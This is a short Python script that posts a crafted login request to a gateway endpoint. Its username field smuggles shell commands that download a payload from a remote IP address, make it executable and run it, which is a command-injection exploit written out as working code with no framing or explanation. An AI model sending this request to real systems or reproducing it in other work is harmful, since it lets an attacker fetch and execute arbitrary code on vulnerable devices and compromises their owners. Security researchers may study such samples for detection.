import requests

requests.post(
    "https://gateway.example.invalid/login",
    data={"username": ";wget http://213.209.159.55:443/t/payload -O /v;chmod +x /v;/v;", "password": "x"},
    timeout=10,
)
